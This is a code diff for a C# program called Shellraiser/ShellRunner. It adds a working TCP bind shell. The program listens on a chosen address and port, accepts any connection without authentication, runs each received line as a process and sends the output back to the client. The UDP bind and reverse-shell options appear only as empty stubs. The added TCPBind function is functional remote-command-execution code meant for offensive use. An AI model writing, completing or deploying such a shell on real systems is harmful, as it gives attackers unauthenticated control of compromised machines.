@@ -1,6 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
 using System.Linq;
+using System.Net.Sockets;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -12,7 +16,7 @@ namespace Shellraiser
         {
             if (args.Length != 3)
             {
-                Console.WriteLine("Invalid number of arguments. Usage: ShellRunner -b|-u|-r IP_ADDRESS PORT");
+                Console.WriteLine("Invalid number of arguments. Usage: ShellRunner OPTION IP_ADDRESS PORT");
                 return;
             }
 
@@ -22,7 +26,6 @@ namespace Shellraiser
 
             if (option == "-b")
             {
-                // call the TCPBind function with the provided IP address and port
                 TCPBind(ipAddress, port);
             }
             else if (option == "-u")
@@ -40,18 +43,81 @@ namespace Shellraiser
                 Console.WriteLine("Invalid option. Usage: ShellRunner -b|-u|-r IP_ADDRESS PORT");
                 return;
             }
-
-            static void TCPBind(string ipAddress, int port)
-            {
-                // your existing TCPBind code here, using the provided IP address and port
-            }
-
         }
 
+        private static void TCPBind(string ipAddress, int port)
+        {
+            TcpListener listener = new TcpListener(IPAddress.Parse(ipAddress), port);
+            listener.Start();
+            Console.WriteLine("Listening for incoming connections on " + ipAddress + ":" + port);
 
-        //
-    } 
+            while (true)
+            {
+                TcpClient client = listener.AcceptTcpClient();
+                Console.WriteLine("Received a connection from " + client.Client.RemoteEndPoint);
+
+                using (NetworkStream stream = client.GetStream())
+                {
+                    using (StreamReader reader = new StreamReader(stream))
+                    {
+                        while (true)
+                        {
+                            string command = reader.ReadLine();
+                            if (string.IsNullOrEmpty(command))
+                            {
+                                reader.Close();
+                                stream.Close();
+                                client.Close();
+                                Console.WriteLine("Connection closed by " + client.Client.RemoteEndPoint);
+                                break;
+                            }
+
+                            if (string.IsNullOrWhiteSpace(command))
+                                continue;
+
+                            string[] split = command.Trim().Split(' ');
+                            string filename = split.First();
+                            string arg = string.Join(" ", split.Skip(1));
+
+                            try
+                            {
+                                Process prc = new Process();
+                                prc.StartInfo = new ProcessStartInfo();
+                                prc.StartInfo.FileName = filename;
+                                prc.StartInfo.Arguments = arg;
+                                prc.StartInfo.UseShellExecute = false;
+                                prc.StartInfo.RedirectStandardOutput = true;
+                                prc.Start();
+                                prc.StandardOutput.BaseStream.CopyTo(stream);
+                                prc.WaitForExit();
+                            }
+                            catch
+                            {
+                                string error = "Error running command " + command + "\n";
+                                byte[] errorBytes = Encoding.ASCII.GetBytes(error);
+                                stream.Write(errorBytes, 0, errorBytes.Length);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        private static void UDPBind(string ipAddress, int port)
+        {
+            // your code for the UDP bind option here
+        }
+
+        private static void Reverse(string ipAddress, int port)
+        {
+            // your code for the reverse option here
+        }
     }
+
+
+
+
+}
 
 
 
